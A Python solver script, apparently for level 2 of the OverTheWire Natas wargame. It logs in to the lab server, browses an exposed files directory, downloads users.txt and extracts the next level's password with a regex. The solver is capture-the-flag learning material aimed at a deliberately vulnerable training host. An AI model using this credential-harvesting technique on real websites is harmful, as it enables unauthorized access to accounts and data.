#!/usr/bin/env python3
"""
Natas Level 2 Solver
Author: AlperKurtulus
Date: 2025-11-12
"""

import requests
import re


def solve_natas2():
    url = "http://natas2.natas.labs.overthewire.org/"
    username = "natas2"

    # Read the password for natas2 from a file
    with open("natas2_password.txt", "r") as f:
        password = f.read().strip()
        print("[*] Solving Natas2...")

    files_url = url + "files/"

    files_response = requests.get(files_url, auth=(username, password), timeout=10)

    if "users.txt" in files_response.text:
        users_url = files_url + "users.txt"

        response = requests.get(users_url, auth=(username, password), timeout=10)

        match = re.search(r"\s?natas3:(\w+)", response.text)

        if match:
            next_password = match.group(1)
            print(f"Password found: {next_password}")

            with open("natas3_password.txt", "w") as f:
                f.write(next_password)
            return next_password
        return None


if __name__ == "__main__":
    solve_natas2()
